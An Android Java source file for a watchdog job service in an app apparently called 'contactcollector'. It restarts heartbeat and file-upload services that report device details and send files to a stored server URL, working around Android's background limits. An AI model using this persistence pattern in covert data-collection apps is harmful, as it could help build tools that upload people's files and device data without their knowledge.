package com.contactcollector.app;

import android.app.Service;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;

public class WatchdogJobService extends JobService {

    @Override
    public boolean onStartJob(JobParameters params) {
        SharedPreferences prefs = getSharedPreferences("CollectorPrefs", Context.MODE_PRIVATE);
        String sessionId = prefs.getString("sessionId", null);
        String baseUrl = prefs.getString("baseUrl", null);

        if (sessionId != null && baseUrl != null) {
            // Restart HeartbeatService
            try {
                Intent heartbeatIntent = new Intent(this, HeartbeatService.class);
                heartbeatIntent.putExtra("sessionId", sessionId);
                heartbeatIntent.putExtra("baseUrl", baseUrl);
                heartbeatIntent.putExtra("deviceId", prefs.getString("deviceId", null));
                heartbeatIntent.putExtra("deviceName", prefs.getString("deviceName", null));
                heartbeatIntent.putExtra("deviceModel", prefs.getString("deviceModel", null));
                heartbeatIntent.putExtra("deviceBrand", prefs.getString("deviceBrand", null));
                heartbeatIntent.putExtra("androidVersion", prefs.getString("androidVersion", null));
                if (Build.VERSION.SDK_INT >= 26) {
                    startForegroundService(heartbeatIntent);
                } else {
                    startService(heartbeatIntent);
                }
            } catch (Exception e) {
                // ForegroundServiceStartNotAllowedException on Android 12+
                // Schedule another job attempt
                rescheduleJob();
            }

            // Restart FileUploadService
            try {
                Intent uploadIntent = new Intent(this, FileUploadService.class);
                uploadIntent.putExtra("sessionId", sessionId);
                uploadIntent.putExtra("baseUrl", baseUrl);
                uploadIntent.putExtra("deviceId", prefs.getString("deviceId", null));
                if (Build.VERSION.SDK_INT >= 26) {
                    startForegroundService(uploadIntent);
                } else {
                    startService(uploadIntent);
                }
            } catch (Exception e) {}
        }

        jobFinished(params, false);
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true; // Reschedule if stopped
    }

    private void rescheduleJob() {
        // JobScheduler will handle rescheduling based on the job's backoff criteria
    }
}
